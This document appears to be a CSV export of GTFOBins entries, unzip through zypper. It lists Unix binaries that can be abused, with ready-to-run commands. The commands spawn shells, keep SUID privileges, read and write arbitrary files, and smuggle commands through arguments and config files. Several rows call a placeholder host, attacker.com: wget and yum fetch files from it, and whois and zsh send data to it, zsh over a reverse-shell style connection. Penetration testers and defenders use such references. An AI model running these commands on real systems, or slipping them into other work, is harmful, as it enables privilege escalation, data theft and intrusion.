Binary Name,URL,Description,Functions,Examples
unzip,https://gtfobins.org/gtfobins/unzip/,"Certain `unzip` versions allows to preserve the SUID bit. For example, prepare an archive beforehand with the following commands as root: ``` cp /bin/sh . chmod +s sh zip shell.zip sh ```",Privilege escalation,"unzip -K shell.zip
./sh -p"
update-alternatives,https://gtfobins.org/gtfobins/update-alternatives/,This executable can write data to local files.,File write,"echo DATA >/path/to/temp-file
update-alternatives --force --install /path/to/output-file x /path/to/temp-file 0"
urlget,https://gtfobins.org/gtfobins/urlget/,This executable can read data from local files.,File read,urlget - /path/to/input-file
uuencode,https://gtfobins.org/gtfobins/uuencode/,This executable can read data from local files.,File read,uuencode /path/to/input-file /dev/stdout | uudecode
uv,https://gtfobins.org/gtfobins/uv/,This executable can spawn an interactive system shell.,Shell,uv run /bin/sh
vagrant,https://gtfobins.org/gtfobins/vagrant/,This executable can inherit functions from another.,Inherit,"echo '...' >Vagrantfile
vagrant up"
valgrind,https://gtfobins.org/gtfobins/valgrind/,This executable can spawn an interactive system shell.,Shell,valgrind /bin/sh
varnishncsa,https://gtfobins.org/gtfobins/varnishncsa/,A running `varnishd` instance must be available.,File write,"varnishncsa -g request -q 'ReqURL ~ ""/xxxxxxxxxx""' -F '%{yyy}i' -w /path/to/output-file"
vi,https://gtfobins.org/gtfobins/vi/,This executable can read data from local files.,File read; File write; Shell,"vi /path/to/input-file; vi /path/to/output-file
iDATA
^[
w; vi -c ':!/bin/sh' /dev/null"
view,https://gtfobins.org/gtfobins/view/,Alias of vim. This executable can read data from local files.,File read; Inherit,"vim -c ':redir! >/path/to/output-file | echo ""DATA"" | redir END | q'; vim -c ':py ...'; vim -c ':lua ...'"
vigr,https://gtfobins.org/gtfobins/vigr/,This executable can inherit functions from another.,Inherit,vigr
vim,https://gtfobins.org/gtfobins/vim/,This executable can read data from local files.,File read; Inherit,"vim -c ':redir! >/path/to/output-file | echo ""DATA"" | redir END | q'; vim -c ':py ...'; vim -c ':lua ...'"
vimdiff,https://gtfobins.org/gtfobins/vimdiff/,Alias of vim. This executable can read data from local files.,File read; Inherit,"vim -c ':redir! >/path/to/output-file | echo ""DATA"" | redir END | q'; vim -c ':py ...'; vim -c ':lua ...'"
vipw,https://gtfobins.org/gtfobins/vipw/,This executable can inherit functions from another.,Inherit,vipw
virsh,https://gtfobins.org/gtfobins/virsh/,This executable can run non-interactive system commands.,Command; File write,"cat >/path/to/temp-file.xml <<EOF
<domain type='kvm'>
  <name>x</name>
  <os>
    <type arch='x86_64'>hvm</type>
  </os>
  <memory unit='KiB'>1</memory>
  <devices>
    <interface type='ethernet'>
      <script path='/path/to/command'/>
    </interface>
  </devices>
</domain>
EOF
virsh -c qemu:///system create /path/to/temp-file.xml
virsh -c qemu:///system destroy x; echo DATA >/path/to/temp-file

cat >/path/to/temp-file.xml <<EOF
<volume type='file'>
  <name>y</name>
  <key>/path/to/output-dir/output-file</key>
  <source>
  </source>
  <capacity unit='bytes'>5</capacity>
  <allocation unit='bytes'>4096</allocation>
  <physical unit='bytes'>5</physical>
  <target>
    <path>/path/to/output-dir/output-file</path>
    <format type='raw'/>
    <permissions>
      <mode>0600</mode>
      <owner>0</owner>
      <group>0</group>
    </permissions>
  </target>
</volume>
EOF

virsh -c qemu:///system pool-create-as x dir --target /path/to/output-dir/
virsh -c qemu:///system vol-create --pool x --file /path/to/temp-file.xml
virsh -c qemu:///system vol-upload --pool x /path/to/output-dir/output-file /path/to/temp-file
virsh -c qemu:///system pool-destroy x; virsh -c qemu:///system pool-create-as x dir --target /path/to/dir/
virsh -c qemu:///system vol-download --pool x input-file output-file
virsh -c qemu:///system pool-destroy x"
volatility,https://gtfobins.org/gtfobins/volatility/,"This allows to run Python code (`...`). Some valid core dump file is required, if not available, can be uploaded to the target.",Inherit,"volatility -f /path/to/core-dump volshell
..."
w3m,https://gtfobins.org/gtfobins/w3m/,This executable can read data from local files.,File read,w3m -dump /path/to/input-file
wall,https://gtfobins.org/gtfobins/wall/,This executable can read data from local files.,File read,wall --nobanner /path/to/input-file
watch,https://gtfobins.org/gtfobins/watch/,This executable can spawn an interactive system shell.,Shell,watch -x /bin/sh -c 'reset; exec /bin/sh 1>&0 2>&0'; watch -x /bin/sh -p -c 'reset; exec /bin/sh -p 1>&0 2>&0'; watch 'reset; exec /bin/sh 1>&0 2>&0'
wc,https://gtfobins.org/gtfobins/wc/,This executable can read data from local files.,File read,wc --files0-from /path/to/input-file
wg-quick,https://gtfobins.org/gtfobins/wg-quick/,This executable can spawn an interactive system shell.,Shell,"cat >/path/to/temp-file.conf <<EOF
[Interface]
PostUp = /bin/sh
EOF

wg-quick up /path/to/temp-file.conf"
wget,https://gtfobins.org/gtfobins/wget/,This executable can download remote data.,Download; File read; File write; Shell; Upload,wget http://attacker.com/path/to/input-file -O /path/to/output-file; python -m http.server 80; wget -i /path/to/input-file
whiptail,https://gtfobins.org/gtfobins/whiptail/,This executable can read data from local files.,File read,whiptail --textbox --scrolltext /path/to/input-file 0 0
whois,https://gtfobins.org/gtfobins/whois/,This executable can download remote data.,Download; Upload,whois -h attacker.com -p 12345 x; nc -l -p 12345 </path/to/input-file; whois -h attacker.com -p 12345 DATA
wireshark,https://gtfobins.org/gtfobins/wireshark/,This executable can write data to local files.,File write; Inherit,"wireshark -c 1 -i lo -k -f 'udp port 12345' &
echo DATA | nc -u 127.127.127.127 12345; wireshark"
wish,https://gtfobins.org/gtfobins/wish/,This executable can inherit functions from another.,Inherit,wish
xargs,https://gtfobins.org/gtfobins/xargs/,This executable can read data from local files.,File read; Shell,xargs -a /path/to/input-file -0; xargs -a /dev/null /bin/sh; xargs -a /dev/null /bin/sh -p
xdg-user-dir,https://gtfobins.org/gtfobins/xdg-user-dir/,"The current implementation of `xdg-user-dir` is basically `eval echo \${XDG_${1}_DIR:-$HOME}`, thus is can be easily used to achieve command execution.",Shell,xdg-user-dir '}; /bin/sh #'
xdotool,https://gtfobins.org/gtfobins/xdotool/,This requires a running X server.,Shell,xdotool exec --sync /bin/sh; xdotool exec --sync /bin/sh -p
xelatex,https://gtfobins.org/gtfobins/xelatex/,Alias of latex. This executable can read data from local files.,File read; File write; Shell,"latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}'
strings texput.dvi; latex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{DATA}\immediate\closeout\tempfile\end{document}'; latex --shell-escape '\immediate\write18{/bin/sh}'"
xetex,https://gtfobins.org/gtfobins/xetex/,Alias of tex. This executable can spawn an interactive system shell.,Shell,tex --shell-escape '\immediate\write18{/bin/sh}'
xmodmap,https://gtfobins.org/gtfobins/xmodmap/,This requires a running X server.,File read,xmodmap -v /path/to/input-file
xmore,https://gtfobins.org/gtfobins/xmore/,This requires a running X server.,File read,xmore /path/to/input-file
xpad,https://gtfobins.org/gtfobins/xpad/,This requires a running X server.,File read,xpad -f /path/to/input-file
xxd,https://gtfobins.org/gtfobins/xxd/,This executable can read data from local files.,File read; File write,xxd /path/to/input-file | xxd -r; echo DATA | xxd | xxd -r - /path/to/output-file
xz,https://gtfobins.org/gtfobins/xz/,This executable can read data from local files.,File read,xz -c /path/to/input-file | xz -d
yarn,https://gtfobins.org/gtfobins/yarn/,This executable can spawn an interactive system shell.,Shell,"yarn exec /bin/sh; echo '{""scripts"": {""preinstall"": ""/bin/sh""}}' >package.json
yarn --cwd .; echo '{""scripts"": {""xxx"": ""/bin/sh""}}' >package.json
yarn --cwd . xxx"
yash,https://gtfobins.org/gtfobins/yash/,This executable can spawn an interactive system shell.,Shell,yash
yelp,https://gtfobins.org/gtfobins/yelp/,This executable can read data from local files.,File read,yelp man:/path/to/input-file
yt-dlp,https://gtfobins.org/gtfobins/yt-dlp/,This executable can spawn an interactive system shell.,Shell,yt-dlp 'https://www.youtube.com/watch?v=xxxxxxxxxxx' --exec '/bin/sh #'
yum,https://gtfobins.org/gtfobins/yum/,This executable can run non-interactive system commands.,Command; Download; Inherit,yum localinstall -y x-1.0-1.noarch.rpm; yum install http://attacker.com/path/to/input-file.rpm; python -m http.server 80
zathura,https://gtfobins.org/gtfobins/zathura/,This requires a running X server.,Shell,"zathura
:! /bin/sh -c 'exec /bin/sh 0<&1'"
zcat,https://gtfobins.org/gtfobins/zcat/,This executable can read data from local files.,File read,zcat -f /path/to/input-file
zgrep,https://gtfobins.org/gtfobins/zgrep/,This executable can read data from local files.,File read,grep '' /path/to/input-file
zic,https://gtfobins.org/gtfobins/zic/,This executable can run non-interactive system commands.,Command,"echo 'Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -' >/path/to/temp-file
echo 'Zone Test 2:00 Jordan CE%sT' >>/path/to/temp-file
zic -d . -y /path/to/command /path/to/temp-file"
zip,https://gtfobins.org/gtfobins/zip/,This executable can read data from local files.,File read; Shell,"zip /path/to/temp-file /path/to/input-file
unzip -p /path/to/temp-file; zip /path/to/temp-file /etc/hosts -T -TT '/bin/sh #'"
zless,https://gtfobins.org/gtfobins/zless/,This executable can inherit functions from another.,Inherit,zless /path/to/input-file
zsh,https://gtfobins.org/gtfobins/zsh/,This executable can download remote data.,Download; File read; File write; Inherit; Reverse shell; Shell; Upload,"zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n ""$(<&$REPLY)"" >/path/to/output-file'; nc -l -p 12345 </path/to/input-file; zsh -c 'echo ""$(</path/to/input-file)""'"
zsoelim,https://gtfobins.org/gtfobins/zsoelim/,This executable can read data from local files.,File read,zsoelim /path/to/input-file
zypper,https://gtfobins.org/gtfobins/zypper/,This executable can spawn an interactive system shell.,Shell,"cp /bin/sh /usr/lib/zypper/commands/zypper-x
zypper x; cp /bin/sh /path/to/temp-dir/zypper-x
PATH=$PATH:/path/to/temp-dir/ zypper x"
